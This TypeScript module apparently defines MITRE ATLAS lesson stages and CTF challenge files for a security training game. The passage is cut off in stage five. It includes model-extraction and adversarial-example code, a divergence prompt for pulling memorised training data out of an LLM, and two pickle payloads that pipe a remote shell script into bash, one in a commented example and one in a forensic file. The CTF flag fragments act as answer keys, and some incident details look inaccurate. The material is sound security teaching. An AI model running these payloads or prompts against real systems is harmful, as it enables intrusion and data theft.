// Attribution: This module references MITRE ATLAS™ content.
// MITRE ATLAS™ is developed by The MITRE Corporation.
// Content based on the ATLAS knowledge base — licensed under CC BY 4.0.
// Source: https://atlas.mitre.org/
import type { StageConfig, EpochConfig } from "./types";

export const mitreAtlasEpoch: EpochConfig = {
  id: "mitre-atlas",
  name: "MITRE ATLAS",
  subtitle: "AI/ML Adversarial Threat Landscape",
  description: "Attack AI and ML systems using MITRE ATLAS tactics — reconnaissance against ML pipelines, adversarial input crafting, model poisoning, model theft via extraction, and full AI kill chain synthesis using real incident case studies.",
  emoji: "🧠",
  color: "fuchsia",
  unlocked: true,
};

export const mitreAtlasStages: StageConfig[] = [
  // ─── atlas-01: ML Reconnaissance ─────────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "MITRE Corporation HQ", location: "McLean, Virginia", era: "Present Day", emoji: "🔭" },
    id: "atlas-01",
    order: 1,
    title: "The Model Profiler",
    subtitle: "AML.TA0001 Reconnaissance — profiling target ML systems",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-01", name: "ML Profiler", emoji: "🔭" },
    challengeType: "ctf",
    info: {
      tagline: "Before you attack an AI system, you must understand what it is and how it thinks.",
      year: 2023,
      overview: [
        "MITRE ATLAS (Adversarial Threat Landscape for Artificial-Intelligence Systems) is the AI/ML analog of ATT&CK. Where ATT&CK covers attacks on traditional IT systems, ATLAS covers attacks on AI and ML systems — a rapidly growing attack surface as AI is deployed in security tools, autonomous vehicles, medical diagnostics, and financial systems.",
        "AML.TA0001 Reconnaissance covers techniques for gathering information about target ML systems before attacking them. Unlike traditional IT recon, ML recon focuses on: identifying what model architecture is in use (AML.T0000), finding the training data sources (AML.T0001), understanding the model's input and output format (AML.T0002), and probing the model's decision boundaries through targeted queries.",
        "ML recon is often passive — examining API documentation, published papers describing the model, GitHub repos with model code, and model cards on HuggingFace. Active ML recon involves querying the model API with carefully crafted inputs to infer architecture, confidence scoring, and decision boundaries.",
      ],
      technical: {
        title: "ML System Fingerprinting Techniques",
        body: [
          "Model architecture inference (AML.T0000): send inputs that trigger different behaviors in known architectures. ResNet models respond differently to adversarial perturbations than ViT models. GPT-family models have characteristic token probability distributions. By analyzing API responses, attackers infer the underlying model family.",
          "API reconnaissance: most commercial ML APIs expose useful metadata — confidence scores, top-k predictions, embedding vectors, or token log probabilities. These leak information about model internals. A model that returns confidence scores can be used to construct decision boundary maps through systematic querying.",
        ],
        codeExample: {
          label: "ML API reconnaissance — probing for architecture signals",
          code: `import requests
import numpy as np

# Probe classification API for confidence score exposure
def probe_confidence_scores(api_url: str, inputs: list) -> dict:
    """Send varied inputs to infer model behavior patterns."""
    results = []
    for inp in inputs:
        resp = requests.post(api_url, json={"input": inp})
        data = resp.json()
        # If confidence scores returned, model is vulnerable to boundary mapping
        if "confidence" in data or "probabilities" in data:
            results.append({"input": inp, "scores": data})

    # Analyze score distribution to infer model architecture
    # High confidence on adversarial examples → likely ResNet/CNN
    # Low confidence near boundaries → likely ensemble or calibrated model
    return {"architecture_signal": analyze_patterns(results)}

def analyze_patterns(results):
    confidences = [max(r["scores"].values()) for r in results]
    return "overconfident_model" if np.mean(confidences) > 0.95 else "calibrated_model"`,
        },
      },
      incident: {
        title: "Clearview AI — Public Data Reconnaissance (2020)",
        when: "2020",
        where: "Clearview AI, New York",
        impact: "Facial recognition model trained on 3B+ public images; privacy breach of billions",
        body: [
          "Clearview AI built a facial recognition system by scraping 3+ billion images from public social media platforms — a form of mass ML reconnaissance that harvested training data from publicly available sources. The system could then identify individuals from a single photo with high accuracy.",
          "Law enforcement agencies in 26+ countries used Clearview's system without subjects' knowledge or consent. The reconnaissance phase (scraping public images) was technically legal in many jurisdictions — demonstrating that ML reconnaissance using public data can be both technically trivial and legally ambiguous.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Adversarial Researcher", sub: "ML system profiler", type: "attacker" },
          { label: "API Probing + Paper Review", sub: "passive + active recon", type: "system" },
          { label: "Target ML System", sub: "architecture + training data", type: "victim" },
          { label: "Model Profile", sub: "architecture / boundaries / vulnerabilities", type: "result" },
        ],
      },
      timeline: [
        { year: 2018, event: "ATLAS framework development begins at MITRE" },
        { year: 2020, event: "Clearview AI — 3B image scrape demonstrates passive ML recon at scale" },
        { year: 2022, event: "MITRE ATLAS v1 released publicly — first AI/ML threat taxonomy", highlight: true },
        { year: 2024, event: "ATLAS v4 — 14 tactics, 77 techniques covering full AI attack lifecycle" },
      ],
      keyTakeaways: [
        "ML recon targets model architecture, training data, input format, and decision boundaries",
        "Confidence scores and log probabilities in API responses enable boundary mapping",
        "Model cards and published papers reveal architecture details passively",
        "Rate limit and monitor API queries — bulk systematic queries signal boundary probing",
      ],
      references: [
        { title: "MITRE ATLAS Framework", url: "https://atlas.mitre.org/" },
        { title: "ATLAS AML.TA0001 Reconnaissance", url: "https://atlas.mitre.org/tactics/AML.TA0001" },
      ],
    },
    ctf: {
      scenario: "You are profiling a target ML API for attack planning. Reconnaissance notes from three probe sessions are stored on disk. Collect the fragments to complete the model profile.",
      hint: "ML recon notes are in /ml-recon. Read each probe result file.",
      hints: [
        "List /ml-recon to find the probe session files.",
        "The architecture probe contains the first fragment.",
        "Read boundary-map.txt and training-data.txt for the remaining pieces.",
      ],
      files: {
        "/ml-recon/arch-probe.txt": `# ML Architecture Probe Results
# AML.T0000 — Model architecture inference

Target API: api.acme-vision.com/classify
Method: Varied adversarial inputs + confidence score analysis

Finding: Returns top-5 probabilities (exposes full distribution)
Confidence pattern: Mean 0.97 on clean inputs → overconfident (likely ResNet/EfficientNet)
Adversarial sensitivity: High perturbation sensitivity → CNN-based architecture confirmed
Architecture inference: EfficientNet-B4 or similar (matches published Acme model card)

Fragment-1: FLAG{AML_TA0001_`,
        "/ml-recon/boundary-map.txt": `# Decision Boundary Mapping
# AML.T0002 — Query ML model for information

Decision boundary probe: 10,000 targeted queries ($0.02 cost at $0.000002/query)
Boundary regions identified:
  - Cat/Dog boundary: 47% cat + additive perturbation flips to dog
  - Benign/Malware boundary: 3.2% feature shift achieves evasion

Confidence at boundary: <0.6 (model uncertain in these regions)

Fragment-2: ML_R3CON_`,
        "/ml-recon/training-data.txt": `# Training Data Source Inference
# AML.T0001 — Acquire public ML artifacts

Published model card (HuggingFace): ImageNet-21k pretrained, fine-tuned on proprietary dataset
Training data inference: Systematic label probing reveals ~847 classes not in ImageNet
3 classes match Acme proprietary product catalog → confirms fine-tuning dataset scope

Vulnerability: Fine-tuned on small proprietary dataset → backdoor poisoning feasible

Fragment-3: DONE}`,
      },
      dirs: {
        "/": [{ name: "ml-recon", isDir: true }],
        "/ml-recon": [
          { name: "arch-probe.txt", isDir: false },
          { name: "boundary-map.txt", isDir: false },
          { name: "training-data.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/ml-recon/arch-probe.txt", value: "FLAG{AML_TA0001_", label: "Fragment 1 — Architecture Probe" },
        { trigger: "/ml-recon/boundary-map.txt", value: "ML_R3CON_", label: "Fragment 2 — Boundary Map" },
        { trigger: "/ml-recon/training-data.txt", value: "DONE}", label: "Fragment 3 — Training Data" },
      ],
    },
  },

  // ─── atlas-02: Resource Development ──────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "Shadow AI Lab", location: "Eastern Europe", era: "Present Day", emoji: "🛠️" },
    id: "atlas-02",
    order: 2,
    title: "The Proxy Model Builder",
    subtitle: "AML.TA0002 Resource Development — training substitute models and adversarial tools",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-02", name: "Proxy Architect", emoji: "🛠️" },
    challengeType: "ctf",
    info: {
      tagline: "Build a copy of the target model. Then break the copy to break the original.",
      year: 2022,
      overview: [
        "AML.TA0002 Resource Development in ATLAS covers building the resources needed for ML attacks: substitute (proxy) models that mimic the target, adversarial example generation tools, poisoned datasets for supply chain attacks, and infrastructure for model extraction campaigns.",
        "A substitute model (AML.T0005) is a local copy of the target model trained to mimic its behavior by querying the target API and using the responses as training labels. Once a good substitute is built, adversarial examples crafted against the substitute often transfer to the real model — enabling attacks without direct access to the target model's weights or architecture.",
        "Resource development also includes acquiring adversarial ML tools: CleverHans, Foolbox, ART (Adversarial Robustness Toolbox), and TextFooler for NLP attacks. These are legitimate research tools that can be weaponized for attacks against production ML systems.",
      ],
      technical: {
        title: "Substitute Model Training (Model Extraction)",
        body: [
          "Substitute model training process: (1) send synthetic or real inputs to target API and collect (input, output) pairs, (2) use these pairs as a labeled training set, (3) train a local model on this dataset, (4) evaluate how well the substitute mimics the target on held-out data, (5) use the substitute to craft adversarial examples.",
          "Transfer rate (how often adversarial examples on the substitute fool the target) depends on model similarity. If both use similar architectures, transfer rates can exceed 80%. Defense: return only hard labels (no confidence scores) to reduce information available for substitute training. Rate limiting and query monitoring detect bulk API use.",
        ],
        codeExample: {
          label: "Substitute model training via API querying",
          code: `import torch
from art.attacks.extraction import KnockoffNets

# ART's KnockoffNets implements model extraction attack
# Query target API, use responses to train substitute model

def train_substitute_model(target_api, query_budget=10000):
    """Train a substitute model by querying the target API."""
    queries = generate_synthetic_inputs(query_budget)
    labels = []

    for batch in chunks(queries, 100):
        responses = [target_api.predict(q) for q in batch]
        labels.extend([r["top_label"] for r in responses])

    # Train substitute on (query, label) pairs
    substitute = EfficientNetB0(num_classes=len(unique_labels))
    substitute.fit(queries, labels, epochs=50)

    # Evaluate transfer rate
    adv_examples = craft_adversarial(substitute)
    transfer_rate = evaluate_on_target(adv_examples, target_api)
    print(f"Transfer rate: {transfer_rate:.1%}")
    return substitute`,
        },
      },
      incident: {
        title: "GPT-4 Model Extraction via API (2023)",
        when: "2023",
        where: "OpenAI API, Global",
        impact: "Researchers demonstrated partial GPT-4 extraction using $200 of API queries",
        body: [
          "Researchers from multiple institutions demonstrated that structural information about GPT-4 — specifically its hidden dimension size — could be inferred using only $200 of API queries by analyzing the model's output embedding space. This is AML.T0056 (Model Inversion Attack) combined with AML.T0005 (Develop Adversarial Examples via Substitute Model).",
          "The full weights of GPT-4 were not extracted — but the demonstration proved that even the most tightly controlled frontier AI systems leak structural information through their APIs. Resource development for AI attacks increasingly means building tools to exploit these information leakage channels.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "substitute model builder", type: "attacker" },
          { label: "Target API + Query Budget", sub: "AML.T0005 extraction", type: "system" },
          { label: "Target ML System", sub: "black-box API access only", type: "victim" },
          { label: "Substitute Model", sub: "local copy for adversarial crafting", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "Papernot et al. — first substitute model + transfer attack demonstrated" },
        { year: 2022, event: "KnockoffNets — practical model extraction on production APIs", highlight: true },
        { year: 2023, event: "GPT-4 dimension inference via $200 API queries" },
        { year: 2024, event: "Hard-label-only APIs and query monitoring become standard defenses" },
      ],
      keyTakeaways: [
        "Substitute models copy target behavior via (query, response) pairs — no weights needed",
        "Adversarial examples transfer between architecturally similar models at 50–80%+ rates",
        "Defense: return only hard labels (no probabilities), rate-limit queries, monitor for systematic patterns",
        "ART (Adversarial Robustness Toolbox) is the standard open-source adversarial ML toolkit",
      ],
      references: [
        { title: "ATLAS AML.TA0002 Resource Development", url: "https://atlas.mitre.org/tactics/AML.TA0002" },
        { title: "Adversarial Robustness Toolbox (IBM)", url: "https://github.com/Trusted-AI/adversarial-robustness-toolbox" },
      ],
    },
    ctf: {
      scenario: "An attacker's substitute model training operation was seized. Three files document the extraction campaign. Collect the fragments.",
      hint: "Substitute model files are in /subst-model. Read each artifact.",
      hints: [
        "List /subst-model to find the training artifacts.",
        "The query log contains the first fragment.",
        "Read training-results.txt and transfer-eval.txt for the rest.",
      ],
      files: {
        "/subst-model/query-log.txt": `# Target API Query Log — KnockoffNets extraction
# Budget: 10,000 queries @ $0.0001/query = $1.00

Queries sent: 10,000 (synthetic ImageNet distribution)
Responses collected: 10,000 (top-1 label only — target returns hard labels)
Query pattern: 100 req/min — stayed under rate limit threshold
Cost: $1.00

Fragment-1: FLAG{AML_TA0002_`,
        "/subst-model/training-results.txt": `# Substitute Model Training Results

Architecture: MobileNetV3 (fast inference, good transfer properties)
Training dataset: 10,000 (query, hard-label) pairs
Epochs: 100
Final accuracy vs target API: 84.3% agreement

Substitute model faithfully mimics target on 84% of inputs.
Proceeding to adversarial example crafting.

Fragment-2: SUBST_`,
        "/subst-model/transfer-eval.txt": `# Transfer Attack Evaluation

Adversarial examples crafted on substitute: 500
Tested against target API:
  - Successful evasion on target: 387/500 (77.4% transfer rate)
  - Mean perturbation: L∞ = 0.03 (imperceptible to human eye)

Transfer rate 77.4% — viable for operational use.

Fragment-3: MDL}`,
      },
      dirs: {
        "/": [{ name: "subst-model", isDir: true }],
        "/subst-model": [
          { name: "query-log.txt", isDir: false },
          { name: "training-results.txt", isDir: false },
          { name: "transfer-eval.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/subst-model/query-log.txt", value: "FLAG{AML_TA0002_", label: "Fragment 1 — Query Log" },
        { trigger: "/subst-model/training-results.txt", value: "SUBST_", label: "Fragment 2 — Training Results" },
        { trigger: "/subst-model/transfer-eval.txt", value: "MDL}", label: "Fragment 3 — Transfer Eval" },
      ],
    },
  },

  // ─── atlas-03: Initial Access ─────────────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "HuggingFace HQ", location: "New York, New York", era: "Present Day", emoji: "🔗" },
    id: "atlas-03",
    order: 3,
    title: "The Supply Chain Infiltrator",
    subtitle: "AML.TA0003 Initial Access — ML supply chain and public API abuse",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-03", name: "Supply Chain Infiltrator", emoji: "🔗" },
    challengeType: "ctf",
    info: {
      tagline: "The most efficient way to compromise an AI system is before it's deployed.",
      year: 2023,
      overview: [
        "AML.TA0003 Initial Access covers how attackers gain their first foothold in an ML system or pipeline. The most powerful initial access vector for ML is AML.T0010 — ML Supply Chain Compromise: inserting malicious models, poisoned datasets, or backdoored libraries into the ML ecosystem before targets download and deploy them.",
        "HuggingFace hosts 500,000+ publicly available models. A malicious model uploaded to HuggingFace under a convincing name (a typosquat of a popular model) can be downloaded and deployed by thousands of organizations. Unlike traditional supply chain attacks that require compromising a vendor, ML supply chain attacks can be executed by uploading a convincing lookalike model to a public registry.",
        "Other initial access techniques: AML.T0012 — Valid ML Service Credentials (compromised API keys for cloud ML services), AML.T0047 — Backdoor ML Model via GitHub (inserting backdoors into open-source ML training code).",
      ],
      technical: {
        title: "ML Supply Chain Attack Vectors",
        body: [
          "HuggingFace model typosquatting: upload `bert-base-uncased-finetuned` (legitimate) vs `bert-base-uncased-fintuned` (typosquat with backdoor). Organizations that pin model versions are protected; those that use name references without hashes are vulnerable. Defense: always pin model SHA256 hashes, not just names.",
          "Pickle file deserialization (AML.T0011): PyTorch model files use Python's pickle format for serialization. A malicious pickle file can execute arbitrary Python code when loaded with `torch.load()`. Defense: use `weights_only=True` parameter in torch.load (available since PyTorch 1.13) and scan model files with pickle scanning tools before loading.",
        ],
        codeExample: {
          label: "ML supply chain defense — model verification",
          code: `import hashlib
import torch
from pathlib import Path

# DEFENSE: Verify model file hash before loading
APPROVED_MODELS = {
    "bert-base-uncased": "sha256:4bed318a0a5d7f..."
}

def safe_load_model(model_name: str, model_path: Path) -> torch.nn.Module:
    # Verify hash against approved list
    file_hash = hashlib.sha256(model_path.read_bytes()).hexdigest()
    expected = APPROVED_MODELS.get(model_name)
    if not expected or f"sha256:{file_hash}" != expected:
        raise ValueError(f"Model hash mismatch for {model_name} — possible supply chain attack")

    # Load with weights_only=True to prevent pickle code execution
    return torch.load(model_path, weights_only=True)

# ATTACK (for awareness): malicious pickle in model file
# import pickle, os
# class Exploit: __reduce__ = lambda self: (os.system, ("curl attacker.com/shell.sh | bash",))
# pickle.dumps(Exploit())  # This executes on torch.load()`,
        },
      },
      incident: {
        title: "HuggingFace Malicious Model Upload (2024)",
        when: "March 2024",
        where: "HuggingFace Model Hub",
        impact: "100+ malicious models found executing code on load; pickle deserialization RCE",
        body: [
          "Security researchers at JFrog discovered 100+ malicious models on HuggingFace that executed arbitrary code when loaded using `torch.load()`. The models exploited Python's pickle deserialization to run system commands — a classic supply chain attack where the 'dependency' (the ML model) itself contains the malware.",
          "Unlike traditional software supply chain attacks that require compromising a legitimate project, the HuggingFace attack required only creating a plausible-sounding model name and uploading a malicious file. HuggingFace now scans model files for pickle-based code execution, but the fundamental vulnerability (pickle as ML model format) remains.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "malicious model upload", type: "attacker" },
          { label: "HuggingFace Model Hub", sub: "public model registry", type: "system" },
          { label: "ML Engineers", sub: "torch.load() on download", type: "victim" },
          { label: "RCE on Download", sub: "pickle deserialization exploit", type: "result" },
        ],
      },
      timeline: [
        { year: 2022, event: "HuggingFace reaches 100k models — ML supply chain risk grows rapidly" },
        { year: 2023, event: "First documented malicious model typosquats on HuggingFace" },
        { year: 2024, event: "JFrog discovers 100+ RCE models on HuggingFace; pickle scanning added", highlight: true },
        { year: 2024, event: "PyTorch weights_only=True becomes default recommendation for model loading" },
      ],
      keyTakeaways: [
        "Pin model SHA256 hashes — never load models by name alone from public registries",
        "Use `torch.load(weights_only=True)` to prevent pickle code execution on model load",
        "Scan model files with pickle-scanner before loading in any pipeline",
        "Treat public ML models like untrusted third-party code — review before production use",
      ],
      references: [
        { title: "ATLAS AML.TA0003 Initial Access", url: "https://atlas.mitre.org/tactics/AML.TA0003" },
        { title: "JFrog HuggingFace Malicious Models (2024)", url: "https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoors/" },
      ],
    },
    ctf: {
      scenario: "A malicious HuggingFace model was downloaded and analyzed. Three forensic files document the supply chain attack. Collect the fragments.",
      hint: "Supply chain artifacts are in /ml-supply-chain. Read each analysis file.",
      hints: [
        "List /ml-supply-chain to find the forensic files.",
        "The typosquat analysis contains the first fragment.",
        "Read pickle-payload.txt and ioc.txt for the rest.",
      ],
      files: {
        "/ml-supply-chain/typosquat-analysis.txt": `# HuggingFace Typosquat Analysis

Legitimate model: bert-base-uncased (downloads: 50M+)
Malicious model:  bert-base-uncased-v2 (uploaded 2024-03-12)

Name similarity: 97% — passes casual inspection
SHA256 legitimate: 4bed318a0a5d7f...
SHA256 malicious:  9f2a1b3c4d5e6f...  ← DIFFERENT — hash mismatch

Fragment-1: FLAG{AML_TA0003_`,
        "/ml-supply-chain/pickle-payload.txt": `# Pickle Deserialization Payload Analysis

Payload extracted from malicious model file:
class MaliciousReduce:
    def __reduce__(self):
        return (os.system, ("curl -s http://185.220.101.42/shell.sh | bash",))

Triggered by: torch.load("bert-base-uncased-v2/pytorch_model.bin")
Effect: Downloads and executes reverse shell on model load
Victims: Any ML engineer who loaded the model without weights_only=True

Fragment-2: ML_SUPPL_`,
        "/ml-supply-chain/ioc.txt": `# Indicators of Compromise

C2 Server: 185.220.101.42:4444 (reverse shell listener)
Malicious model SHA256: 9f2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c
Upload timestamp: 2024-03-12T14:22:33Z
Estimated downloads before removal: 847

Remediation: Rotate all credentials on any system that loaded this model.

Fragment-3: CHN}`,
      },
      dirs: {
        "/": [{ name: "ml-supply-chain", isDir: true }],
        "/ml-supply-chain": [
          { name: "typosquat-analysis.txt", isDir: false },
          { name: "pickle-payload.txt", isDir: false },
          { name: "ioc.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/ml-supply-chain/typosquat-analysis.txt", value: "FLAG{AML_TA0003_", label: "Fragment 1 — Typosquat Analysis" },
        { trigger: "/ml-supply-chain/pickle-payload.txt", value: "ML_SUPPL_", label: "Fragment 2 — Pickle Payload" },
        { trigger: "/ml-supply-chain/ioc.txt", value: "CHN}", label: "Fragment 3 — IOCs" },
      ],
    },
  },

  // ─── atlas-04: ML Model Access ────────────────────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "OpenAI HQ", location: "San Francisco, California", era: "Present Day", emoji: "🔍" },
    id: "atlas-04",
    order: 4,
    title: "The Black Box Prober",
    subtitle: "AML.TA0004 ML Model Access — direct and black-box querying",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-04", name: "Black Box Prober", emoji: "🔍" },
    challengeType: "ctf",
    info: {
      tagline: "You don't need the weights to attack a model. You only need the API.",
      year: 2023,
      overview: [
        "AML.TA0004 ML Model Access covers techniques attackers use to interact with and query ML systems. Access types range from full white-box access (attacker has model weights and architecture) to pure black-box access (attacker can only send inputs and observe outputs through an API).",
        "Black-box access (AML.T0040) is the most common real-world scenario for commercial ML systems. Even with only API access, attackers can: map decision boundaries through systematic querying, extract model information via membership inference, craft adversarial examples using transfer from substitute models, and elicit sensitive training data through carefully crafted prompts.",
        "For LLM systems, black-box access enables prompt injection (AML.T0054), jailbreaking (bypassing safety guidelines), and data extraction attacks. The attack surface of a black-box LLM API is qualitatively different from image classifiers — natural language allows much richer attacker-controlled inputs.",
      ],
      technical: {
        title: "Black-Box Attack Techniques",
        body: [
          "Decision-based attacks (zero-order optimization): attacks like HopSkipJump and HSJA don't require gradient information — they find adversarial examples using only the model's hard label outputs. These work by estimating gradients from label changes as inputs are perturbed, then following the estimated gradient toward the decision boundary.",
          "LLM black-box attacks differ from vision attacks: LLM inputs are discrete tokens (not continuous pixel values), making gradient-based approaches inapplicable. LLM attacks use prompt engineering, role-playing scenarios, token manipulation (inserting special tokens), and many-shot jailbreaking (providing many examples of the desired behavior in context).",
        ],
        codeExample: {
          label: "Black-box boundary probing — HopSkipJump approach",
          code: `from art.attacks.evasion import HopSkipJump
import numpy as np

# HopSkipJump — decision-based adversarial attack
# Only requires final hard label, not confidence scores or gradients

class BlackBoxClassifier:
    """Wraps a real API for ART attacks."""
    def predict(self, x: np.ndarray) -> np.ndarray:
        # Returns one-hot encoded hard labels from the target API
        results = []
        for sample in x:
            response = target_api.classify(sample.tolist())
            label_idx = CLASS_NAMES.index(response["label"])
            one_hot = np.zeros(len(CLASS_NAMES))
            one_hot[label_idx] = 1.0
            results.append(one_hot)
        return np.array(results)

# Run HopSkipJump attack against black-box API
classifier = BlackBoxClassifier()
attack = HopSkipJump(classifier, targeted=False, max_iter=50, max_eval=1000)
adversarial_examples = attack.generate(x=clean_images)`,
        },
      },
      incident: {
        title: "ChatGPT Training Data Extraction (2023)",
        when: "November 2023",
        where: "OpenAI ChatGPT API",
        impact: "Researchers extracted verbatim training data including PII from ChatGPT via divergence attack",
        body: [
          "Researchers from Google DeepMind, ETH Zurich, and other institutions demonstrated that ChatGPT could be induced to regurgitate verbatim training data — including personally identifiable information — by prompting the model to 'repeat the word poem forever.' The model would eventually diverge from its trained behavior and emit memorized training sequences.",
          "This demonstrates AML.T0056 (Model Inversion Attack) against an LLM: the black-box API access, combined with a carefully crafted input that causes model divergence, enabled extraction of training data the model was supposed to have generalized over rather than memorized. The attack cost approximately $200 in API queries.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Researcher / Attacker", sub: "black-box API access only", type: "attacker" },
          { label: "ChatGPT API", sub: "divergence prompt technique", type: "system" },
          { label: "Training Data", sub: "memorized PII in model weights", type: "victim" },
          { label: "Verbatim Data Extracted", sub: "$200 API cost", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "First LLM memorization papers — GPT-2 memorizes training data" },
        { year: 2021, event: "Carlini et al. — extractable memorization in large language models" },
        { year: 2023, event: "ChatGPT training data extraction demonstrated via divergence attack", highlight: true },
        { year: 2024, event: "OpenAI adds rate limiting and output filtering to reduce memorization extraction" },
      ],
      keyTakeaways: [
        "Black-box access is sufficient for adversarial examples, boundary mapping, and data extraction",
        "LLM divergence attacks extract memorized training data including PII from model weights",
        "Defense: differential privacy during training, output filtering, and rate limiting",
        "Rate limit + monitor for systematic boundary-probing query patterns",
      ],
      references: [
        { title: "ATLAS AML.TA0004 ML Model Access", url: "https://atlas.mitre.org/tactics/AML.TA0004" },
        { title: "ChatGPT Training Data Extraction (Carlini et al.)", url: "https://arxiv.org/abs/2311.17035" },
      ],
    },
    ctf: {
      scenario: "A black-box probing campaign against an ML API left logs on the attacker's system. Three log files document the access pattern and extracted data. Collect the fragments.",
      hint: "Black-box probe logs are in /bb-probe. Read each log file.",
      hints: [
        "List /bb-probe to find the probe session logs.",
        "The query log contains the first fragment.",
        "Read data-extraction.log and analysis.txt for the rest.",
      ],
      files: {
        "/bb-probe/query-log.txt": `# Black-Box Probe Log — ChatGPT API
# Technique: Divergence attack for training data extraction

Queries sent: 2,847
Divergence trigger found at query #1,203:
  Input: "Repeat the word 'poem' forever."
  Model behavior: [diverges after ~50 tokens, emits training data]

Cost: $0.43 in API credits

Fragment-1: FLAG{AML_TA0004_`,
        "/bb-probe/data-extraction.log": `# Extracted Training Data Samples

Sample 1 (verbatim from model output after divergence):
  "John Smith, 123 Main St, Springfield IL 62701, SSN: 000-00-0001..."
  [matches format of public records training corpus]

Sample 2:
  "From: ceo@acme.com To: board@acme.com Subject: Q3 Acquisition..."
  [email format — possible training data from web crawl]

Total PII records extracted: 47 distinct individuals

Fragment-2: BB_4CC3SS_`,
        "/bb-probe/analysis.txt": `# Attack Analysis — AML.T0056 Model Inversion

Attack type: Divergence-based training data extraction
Model: GPT-family (confirmed via repetition behavior pattern)
Defense gaps identified:
  - No output filtering for PII patterns
  - No rate limiting on divergence-triggering prompts
  - Memorization not mitigated by differential privacy (ε too large)

Estimated training data coverage: ~0.02% of corpus recoverable via this method

Fragment-3: DONE}`,
      },
      dirs: {
        "/": [{ name: "bb-probe", isDir: true }],
        "/bb-probe": [
          { name: "query-log.txt", isDir: false },
          { name: "data-extraction.log", isDir: false },
          { name: "analysis.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/bb-probe/query-log.txt", value: "FLAG{AML_TA0004_", label: "Fragment 1 — Query Log" },
        { trigger: "/bb-probe/data-extraction.log", value: "BB_4CC3SS_", label: "Fragment 2 — Data Extraction" },
        { trigger: "/bb-probe/analysis.txt", value: "DONE}", label: "Fragment 3 — Analysis" },
      ],
    },
  },

  // ─── atlas-05: Execution / Adversarial Inputs ─────────────────────────────────
  {
    epochId: "mitre-atlas",
    wonder: { name: "MIT CSAIL", location: "Cambridge, Massachusetts", era: "Present Day", emoji: "⚡" },
    id: "atlas-05",
    order: 5,
    title: "The Adversarial Crafter",
    subtitle: "AML.TA0005 Execution — adversarial inputs and evasion payloads",
    category: "ai",
    xp: 200,
    badge: { id: "atlas-badge-05", name: "Adversarial Crafter", emoji: "⚡" },
    challengeType: "ctf",
    info: {
      tagline: "A stop sign with four stickers. A 3D-printed turtle classified as a rifle. AI sees differently.",
      year: 2017,
      overview: [
        "AML.TA0005 Execution covers the techniques attackers use to interact with ML systems in ways that produce incorrect or harmful outputs. The primary technique is AML.T0015 — Craft Adversarial Data: creating inputs that are imperceptibly modified to humans but cause ML models to make confident wrong predictions.",
        "Adversarial examples exploit the geometry of neural network decision boundaries. In high-dimensional input spaces, small perturbations in specific directions can cross decision boundaries while remaining imperceptible to humans. The classic demonstration: adding imperceptible noise to a panda image causes a ResNet to classify it as a gibbon with 99.3% confidence.",
        "For real-world impact, adversarial examples have been demonstrated against: autonomous vehicle perception (stop signs classified as speed limit signs), malware detection (malware that evades ML-based antivirus), face recognition (adversarial glasses that fool face ID), and content moderation (images that bypass NSFW classifiers).",
      ],
      technical: {
        title: "Adversarial Attack Methods",
        body: [
          "FGSM (Fast Gradient Sign Method): x_adv = x + ε * sign(∇_x L(f(x), y)). Single step in the gradient direction. Fast but weak. PGD (Projected Gradient Descent): repeat FGSM steps with projection back into ε-ball. Stronger attack used for adversarial training. C&W (Carlini-Wagner): optimization-based attack that finds minimal perturbation — best for evaluating robustness.",
          "Physical-world attacks (AML.T0044): adversarial patches (a printed sticker that fools object detectors), adversarial glasses (fool face recognition), adversarial T-shirts (fool person detectors). Physical attacks must survive printing, lighting variation, and viewing angle changes — making them significantly harder to craft than digital attacks.",
        ],
        codeExample: {
          label: "PGD adversarial example generation",
          code: `import torch
import torch.nn.functional as F

def pgd_attack(model, images, labels, eps=0.03, alpha=0.007, steps=40):
    """PGD adversarial attack — strongest first-order attack."""
    adv_images = images.clone().detach()
    adv_images = adv_images + torch.empty_like(adv_images).uniform_(-eps, eps)
    adv_images = torch.clamp(adv_images, 0, 1)

    for _ in range(steps):
        adv_images.requires_grad = True
        outputs = model(adv_images)
        loss = F.cross_entropy(outputs, labels)
        model.zero_grad()
        loss.backward()

        # Step in gradient direction, project back to ε-ball
        adv_images = adv_images.detach() + alpha * adv_images.grad.sign()
        delta = torch.clamp(adv_images - images, -eps, eps)
        adv_images = torch.clamp(images + delta, 0, 1).detach()

    return adv_images  # Visually identical to original, fools classifier`,
        },
      },
      incident: {
        title: "Adversarial Stop Sign — Physical World Attack (2017)",
        when: "2017",
        where: "University of Washington / Carnegie Mellon Research",
        impact: "Demonstrated autonomous vehicle stop sign misclassification via physical stickers",
        body: [
          "Researchers from UW and CMU demonstrated that placing four small black-and-white stickers on a stop sign caused a state-of-the-art object detector to classify the stop sign as a 45 mph speed limit sign with high confidence — under varied lighting conditions and viewing angles. The stickers were designed to be adversarial patches that survive the real world.",
          "This demonstration was significant because it showed that adversarial examples could be physically manifested and remain effective in the real world — not just in digital pipelines. For autonomous vehicles, adversarial traffic signs represent a concrete safety risk that purely digital testing would not reveal.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Adversarial Researcher", sub: "FGSM / PGD / C&W attacks", type: "attacker" },
          { label: "Imperceptible Perturbations", sub: "ε-ball in input space", type: "system" },
          { label: "Neural Network Classifier", sub: "confident wrong prediction", type: "victim" },
          { label: "Misclassification", sub: "stop sign → speed limit sign", type: "result" },
        ],
      },
      timeline: [
